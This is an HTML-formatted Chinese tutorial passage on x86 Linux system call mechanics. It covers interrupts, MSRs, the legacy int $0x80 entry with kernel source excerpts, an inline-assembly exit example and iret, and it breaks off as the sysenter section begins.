&lt;p&gt;有许多方法能引起特权级转变并触发内核执行相关操作。&lt;/p&gt;
&lt;p&gt;从常用的方法说起：中断。&lt;/p&gt;
&lt;h3 id=&quot;中断&quot;&gt;&lt;a href=&quot;#中断&quot; class=&quot;headerlink&quot; title=&quot;中断&quot;&gt;&lt;/a&gt;中断&lt;/h3&gt;&lt;p&gt;可以把中断理解为硬件或软件引发的一个事件。&lt;/p&gt;
&lt;p&gt;硬件中断源于硬件设备通知内核某个特殊事件的发生。网卡收到数据包时产生的中断是比较常见的硬件中断。&lt;/p&gt;
&lt;p&gt;软件中断由某段代码的执行而引发。在x86-64系统中，执行 int指令就会引发软件中断。&lt;/p&gt;
&lt;p&gt;中断通常都会被分配一个中断号。这些中断号有着特殊的含义。&lt;/p&gt;
&lt;p&gt;想象存储在CPU内存中的一个数组，数组的每个条目都映射为一个中断号。每个条目还存储了当CPU接收到中断信号后将要执行的函数地址以及一些其它的选项，选项中含有中断处理函数应该在哪个特权级上执行的信息。&lt;/p&gt;
&lt;p&gt;下面的这张图取自Intel CPU手册，描述了数组中每个条目的存储结构。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppf1.com1.z0.glb.clouddn.com/idt.png&quot; alt=&quot;idt&quot;&gt;&lt;/p&gt;
&lt;p&gt;仔细看，会发现有一个2位的域标记着特权级描述符(DPL)。这个值决定了当执行中断处理函数时CPU需要的最低特权级。&lt;/p&gt;
&lt;p&gt;当CPU接收到特定类型事件时，通过DPL信息知道它应该执行在哪个地址空间，以及事件处理器应该执行在哪个特权级上。&lt;/p&gt;
&lt;p&gt;实际上，在x86-64系统中有许多不同的方法处理中断。对这个感兴趣想了解更多的可以参考 &lt;a href=&quot;http://wiki.osdev.org/8259_PIC&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;8259 Programmable Interrupt Controller, Advanced Interrupt Controllers&lt;/a&gt;和&lt;a href=&quot;http://wiki.osdev.org/IOAPIC&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt; IO Advanced Interrupt Controllers&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;当处理硬件中断和软件中断时，还会涉及到其它一些复杂的工作要处理，比如中断号冲突与重映射等问题。&lt;/p&gt;
&lt;p&gt;讨论系统调用时，我们不必关注以上这些细节。&lt;/p&gt;
&lt;h3 id=&quot;特殊模块寄存器&quot;&gt;&lt;a href=&quot;#特殊模块寄存器&quot; class=&quot;headerlink&quot; title=&quot;特殊模块寄存器&quot;&gt;&lt;/a&gt;特殊模块寄存器&lt;/h3&gt;&lt;p&gt;特殊模块寄存器（MSRs)是用来控制CPU某些特性的一组控制寄存器。 CPU文档中列举了每个MSRs的地址。&lt;/p&gt;
&lt;p&gt;可以执行CPU指令 &lt;code&gt;rdmsr/wrmsr&lt;/code&gt;来读/写 MSRs.&lt;/p&gt;
&lt;p&gt;也有一些命令行工具可以用来读/写 MSRs. 但不建议这么做，因为修改这些值（尤其当系统在运行的时候)是相当危险的，除非你真的能做到小心翼翼。&lt;/p&gt;
&lt;p&gt;如果你不介意让你的系统不稳定或者不可恢复的损坏你的数据，你可以安装&lt;code&gt;msr-tools&lt;/code&gt;工具并加载&lt;code&gt;msr&lt;/code&gt;内核模块来读/写MSRs.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;% sudo apt-get install msr-tools
% sudo modprobe msr
% sudo rdmsr
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;下文中我们会看到一些系统调用的方法就会用到这些MSRs.&lt;/p&gt;
&lt;h3 id=&quot;编写汇编代码触发系统调用不是个好主意&quot;&gt;&lt;a href=&quot;#编写汇编代码触发系统调用不是个好主意&quot; class=&quot;headerlink&quot; title=&quot;编写汇编代码触发系统调用不是个好主意&quot;&gt;&lt;/a&gt;编写汇编代码触发系统调用不是个好主意&lt;/h3&gt;&lt;p&gt;自己编写汇编代码来触发系统调用可不是个好主意。&lt;/p&gt;
&lt;p&gt;最大的原因就在于一些系统调用在执行之前或之后会有额外的代码需要在glibc中执行。&lt;/p&gt;
&lt;p&gt;在下面的例子中，我们会用到&lt;code&gt;exit&lt;/code&gt;系统调用。你可以在&lt;code&gt;exit&lt;/code&gt;被调用时利用&lt;a href=&quot;http://man7.org/linux/man-pages/man3/atexit.3.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;atexit&lt;/code&gt;&lt;/a&gt;注册处理函数。&lt;/p&gt;
&lt;p&gt;这些处理函数都是被glibc调用的，注意，不是kernel. 因此，当你自己写汇编代码调用&lt;code&gt;exit&lt;/code&gt;时，你自己注册的处理函数是不会执行的，因为你绕过了glibc。&lt;/p&gt;
&lt;p&gt;然而，写汇编代码来执行系统调用是个不错的学习经验。&lt;/p&gt;
&lt;h2 id=&quot;传统系统调用&quot;&gt;&lt;a href=&quot;#传统系统调用&quot; class=&quot;headerlink&quot; title=&quot;传统系统调用&quot;&gt;&lt;/a&gt;传统系统调用&lt;/h2&gt;&lt;p&gt;从上文的准备知识中，我们可以知道两件事情：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;可以通过软件中断来触发内核的执行&lt;/li&gt;
&lt;li&gt;可以通过汇编指令 &lt;code&gt;int&lt;/code&gt; 来产生软件中断&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;结合这两个概念我们再去了解Linux系统中的传统系统调用接口。&lt;/p&gt;
&lt;p&gt;Linux内核分配了一个特殊的软件中断号，让用户程序进入到内核中执行系统调用。&lt;/p&gt;
&lt;p&gt;Linux内核会为中断处理号 128(0x80)注册一个中断处理器&lt;code&gt;ia32-syscall&lt;/code&gt;. 通过代码来看看到底怎么做的。&lt;/p&gt;
&lt;p&gt;内核3.13.0源码中的&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/kernel/traps.c#L770&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/kernel/traps.c&lt;/code&gt;&lt;/a&gt;中有个&lt;code&gt;trap_init&lt;/code&gt;函数:&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; __&lt;span class=&quot;function&quot;&gt;init &lt;span class=&quot;title&quot;&gt;trap_init&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* ..... other code ... */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        set_system_intr_gate(IA32_SYSCALL_VECTOR, ia32_syscall);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其中，&lt;code&gt;IA32_SYSCALL_VECTOR&lt;/code&gt;在&lt;code&gt;arch/x86/include/asm/irq_vectors.h&lt;/code&gt;中被定义为 &lt;code&gt;0x80&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;进一步看，既然内核预留了一个软件中断供用户程序来触发内核的执行，那在这么多的系统调用中，内核又是如何知道该执行哪一个呢？&lt;/p&gt;
&lt;p&gt;这时，用户程序需要在&lt;code&gt;eax&lt;/code&gt;寄存器中放入系统调用号。系统调用相关的其它参数会被传入到剩余的通用寄存器中。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/ia32/ia32entry.S#L378-L397&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/ia32/ia32entry.S&lt;/code&gt;&lt;/a&gt;中的注释对此有具体的介绍:&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;* Emulated IA32 system calls via &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0x80&lt;/span&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;* Arguments:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;* %eax System call number.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;* %ebx Arg1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;* %ecx Arg2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;* %edx Arg3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;* %esi Arg4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;* %edi Arg5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;* %ebp Arg6    [note: not saved in the &lt;span class=&quot;built_in&quot;&gt;stack&lt;/span&gt; frame, should not be touched]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;现在我们知道了如何执行系统调用以及如何传递这些参数，可以开始试着写一些内联汇编代码。&lt;/p&gt;
&lt;h3 id=&quot;自己编写汇编代码使用传统系统调用&quot;&gt;&lt;a href=&quot;#自己编写汇编代码使用传统系统调用&quot; class=&quot;headerlink&quot; title=&quot;自己编写汇编代码使用传统系统调用&quot;&gt;&lt;/a&gt;自己编写汇编代码使用传统系统调用&lt;/h3&gt;&lt;p&gt;要使用传统系统调用，你可以写一小段内联汇编代码，尽管从学习的角度来看这很有用，我绝不鼓励读者们自己编写汇编代码使用系统调用。&lt;/p&gt;
&lt;p&gt;在下面的例子中，我们会试着去执行&lt;code&gt;exit&lt;/code&gt;系统调用，它只需要一个参数：退出状态.&lt;/p&gt;
&lt;p&gt;首先，我们需要找到&lt;code&gt;exit&lt;/code&gt;的系统调用号。Linux内核中有个文件将每个系统调用列在了一张表中。很多脚本在构建的时候会处理此文件以产生一些头文件供用户使用。&lt;/p&gt;
&lt;p&gt;看看上述的表格，可以在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/syscalls/syscall_32.tbl&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/syscalls/syscall_32.tbl&lt;/code&gt;&lt;/a&gt;找到:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1 i386 exit sys_exit
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可见 &lt;code&gt;exit&lt;/code&gt;的系统调用号是1. 根据上文所述，我们需要将系统调用号写入&lt;code&gt;eax&lt;/code&gt;寄存器中，以及第一个参数（退出状态)写入&lt;code&gt;ebx&lt;/code&gt;寄存器中。&lt;/p&gt;
&lt;p&gt;下面介绍的一段C代码（含有一些内联汇编）做的就是上面的工作。可以看到退出状态是’42’.&lt;/p&gt;
&lt;p&gt;（实际上这个例子可以简化一些，但我认为多用一些文字描述会更有用，让那些之前从没见过GCC内联汇编代码的人也可以用下面的例子作为参考）&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *argv[])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; syscall_nr = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; exit_status = &lt;span class=&quot;number&quot;&gt;42&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;asm&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;&quot;movl %0, %%eax\n&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;             &lt;span class=&quot;string&quot;&gt;&quot;movl %1, %%ebx\n&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;string&quot;&gt;&quot;int $0x80&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    : &lt;span class=&quot;comment&quot;&gt;/* output parameters, we aren&#39;t outputting anything, no none */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;/* (none) */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    : &lt;span class=&quot;comment&quot;&gt;/* input parameters mapped to %0 and %1, repsectively */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;string&quot;&gt;&quot;m&quot;&lt;/span&gt; (syscall_nr), &lt;span class=&quot;string&quot;&gt;&quot;m&quot;&lt;/span&gt; (exit_status)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    : &lt;span class=&quot;comment&quot;&gt;/* registers that we are &quot;clobbering&quot;, unneeded since we are calling exit */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;string&quot;&gt;&quot;eax&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;ebx&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接下来，编译，执行，然后检查退出状态。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ gcc -o test test.c
$ ./test
$ echo $?
42
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功了！ 这就是我们利用软件中断来执行&lt;code&gt;exit&lt;/code&gt;系统调用的全过程。&lt;/p&gt;
&lt;h3 id=&quot;内核层面：int-0x80入口&quot;&gt;&lt;a href=&quot;#内核层面：int-0x80入口&quot; class=&quot;headerlink&quot; title=&quot;内核层面：int $0x80入口&quot;&gt;&lt;/a&gt;内核层面：&lt;code&gt;int $0x80&lt;/code&gt;入口&lt;/h3&gt;&lt;p&gt;目前为止，我们知道了如何从用户程序中触发系统调用。&lt;br&gt;下面来看看内核如何利用系统调用号执行系统调用中的代码。&lt;/p&gt;
&lt;p&gt;回顾前文，内核调用&lt;code&gt;ia32_syscall&lt;/code&gt;来注册系统调用处理函数。&lt;/p&gt;
&lt;p&gt;该函数是用汇编实现的，定义在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/ia32/ia32entry.S#L426&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/ia32/ia32entry.S&lt;/code&gt;&lt;/a&gt;中。该函数做了很多事情，但最重要的还是它触发了实际的系统调用：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ia32_do_call:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;function&quot;&gt;IA32_ARG_FIXUP&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        call *&lt;span class=&quot;title&quot;&gt;ia32_sys_call_table&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(,%rax,&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;)&lt;/span&gt; &lt;span class=&quot;meta&quot;&gt;# xxx: rip relative&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注意到，&lt;code&gt;IA32_ARG_FIXUP&lt;/code&gt; 是一个宏，做的是重新处理初始参数，以让当前的系统调用层能正确的理解这些参数。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ia32_sys_call_table&lt;/code&gt; 是&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/ia32/ia32entry.S#L426&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/ia32/syscall_ia32.c&lt;/code&gt;&lt;/a&gt;中定义的一张表。注意代码中的最后一行 &lt;code&gt;#include&lt;/code&gt;. &lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;sys_call_ptr_t&lt;/span&gt; ia32_sys_call_table[__NR_ia32_syscall_max+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         * Smells like a compiler bug -- it doesn&#39;t work&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         * when the &amp;amp; below is removed.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        [&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; ... __NR_ia32_syscall_max] = &amp;amp;compat_ni_syscall,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#include &amp;lt;&lt;span class=&quot;keyword&quot;&gt;asm&lt;/span&gt;/syscalls_32.h&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;回想一下前面提到在 &lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/syscalls/syscall_32.tbl&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/syscalls/syscall_32.tbl&lt;/code&gt;&lt;/a&gt; 中定义的系统调用表。&lt;/p&gt;
&lt;p&gt;一些脚本在编译的时候使用这张表生成&lt;code&gt;syscalls_32.h&lt;/code&gt;头文件。头文件中由一些有效的C代码组成，就像上面一样，以&lt;code&gt;#include&lt;/code&gt;的形式插入到&lt;code&gt;ia32_sys_call_table&lt;/code&gt;中，里面含有系统调用号引用的函数地址。&lt;/p&gt;
&lt;p&gt;到目前为止，你已经知道如何通过传统系统调用进入内核了。&lt;/p&gt;
&lt;h3 id=&quot;iret-从传统系统调用返回&quot;&gt;&lt;a href=&quot;#iret-从传统系统调用返回&quot; class=&quot;headerlink&quot; title=&quot;iret: 从传统系统调用返回&quot;&gt;&lt;/a&gt;iret: 从传统系统调用返回&lt;/h3&gt;&lt;p&gt;了解了如何通过软件中断进入内核执行系统调用之后，应该思考，内核应该如何返回到用户程序中并恢复其原始特权级呢？&lt;/p&gt;
&lt;p&gt;查阅 &lt;a href=&quot;ftp://download.intel.com/design/processor/manuals/253668.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Intel Software Developer’s Manual&lt;/a&gt; （警告：PDF很大), 可以找到一些有用的图表，描述了当特权级转变时，程序栈的状态。&lt;/p&gt;
&lt;p&gt;请看图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppf1.com1.z0.glb.clouddn.com/isr_stack.png&quot; alt=&quot;isr-stack&quot;&gt;&lt;/p&gt;
&lt;p&gt;当用户程序利用软件中断将执行环境转变到内核函数&lt;code&gt;ia32_syscall&lt;/code&gt;中时，发生特权级转变。上图描述的就是当进入到&lt;code&gt;ia32_syscall&lt;/code&gt;中时栈的状态。&lt;/p&gt;
&lt;p&gt;这就意味着在&lt;code&gt;ia32_syscall&lt;/code&gt;执行前，返回地址和CPU标志(用来编码特权级)以及其它的信息都被存储在栈中。&lt;/p&gt;
&lt;p&gt;如此一来，为了恢复用户程序的执行，内核只需要将栈中的这些值拷贝到相应的寄存器中。&lt;/p&gt;
&lt;p&gt;好了，这些都是如何做到的？&lt;/p&gt;
&lt;p&gt;有很多方法可以做到，其中最简单的就是使用&lt;code&gt;iret&lt;/code&gt;指令。&lt;/p&gt;
&lt;p&gt;Intel指令集手册中指出，&lt;code&gt;iret&lt;/code&gt;指令从栈中将返回地址和保存的寄存器的值按照初始顺序pop出来。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;As with a real-address mode interrupt return, the IRET instruction pops the return instruction pointer, return code segment selector, and EFLAGS image from the stack to the EIP, CS, and EFLAGS registers, respectively, and then resumes execution of the interrupted program or procedure.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在Linux内核中找到相关的代码有一点点困难，因为它们隐藏在许多宏中,类似的标志以及系统调用退出的追踪信息都会经过额外的处理。&lt;/p&gt;
&lt;p&gt;遍历内核中汇编存根里面所有的宏最终会找到&lt;code&gt;iret&lt;/code&gt;，用来从系统调用返回到用户程序。&lt;/p&gt;
&lt;p&gt;在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/kernel/entry_64.S#L1042-L1043&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/kernel/entry_64.S&lt;/code&gt;&lt;/a&gt;中可以找到&lt;code&gt;irq_return&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;irq_return:
INTERRUPT_RETURN
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其中&lt;code&gt;INTERRUPT_RETURN&lt;/code&gt;在 &lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/include/asm/irqflags.h#L132&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/include/asm/irqflags.h&lt;/code&gt;&lt;/a&gt;被定义为&lt;code&gt;iretq&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;到目前为止，你已经知道传统系统调用是如何工作的了。&lt;/p&gt;
&lt;h2 id=&quot;快速系统调用&quot;&gt;&lt;a href=&quot;#快速系统调用&quot; class=&quot;headerlink&quot; title=&quot;快速系统调用&quot;&gt;&lt;/a&gt;快速系统调用&lt;/h2&gt;&lt;p&gt;传统的系统调用过程看起来似乎很合理，但最新的方法是不需要软件中断来触发系统调用的，而且比使用软件中断更快。&lt;/p&gt;
&lt;p&gt;这两种快速的方法都分别包含两条指令。一条指令用来进入内核，另一条则用来退出内核。两种方法都在Intel CPU的文档中定义为”快速系统调用”.&lt;/p&gt;
&lt;p&gt;然而，Intel和AMD在具体实现的时候，针对CPU分别运行在32位和64位时该采用哪种方法才有更效的问题上产生了分歧。&lt;/p&gt;
&lt;p&gt;为了在Intel和AMD处理器中最大化兼容性：&lt;/p&gt;
&lt;p&gt;   32位系统中使用：&lt;code&gt;sysenter&lt;/code&gt;和&lt;code&gt;sysexit&lt;/code&gt;&lt;br&gt;   64位系统中使用：&lt;code&gt;syscall&lt;/code&gt;和&lt;code&gt;sysret&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;32位快速系统调用&quot;&gt;&lt;a href=&quot;#32位快速系统调用&quot; class=&quot;headerlink&quot; title=&quot;32位快速系统调用&quot;&gt;&lt;/a&gt;32位快速系统调用&lt;/h3&gt;&lt;h4 id=&quot;sysenter-sysexit&quot;&gt;&lt;a href=&quot;#sysenter-sysexit&quot; class=&quot;headerlink&quot; title=&quot;sysenter/sysexit&quot;&gt;&lt;/a&gt;&lt;code&gt;sysenter&lt;/code&gt;/&lt;code&gt;sysexit&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;  用&lt;code&gt;sysenter&lt;/code&gt;触发系统调用比传统中断方法要复杂一些，其涉及到用户程序(通过glibc）与内核之间更多的协调问题。&lt;/p&gt;
&lt;p&gt;  我们逐步来了解这些细节。首先来看看Intel指令集参考手册中是如何描述&lt;code&gt;sysenter&lt;/code&gt;以及如何使用它的。&lt;/p&gt;
&lt;p&gt;  看下面：&lt;/p&gt;
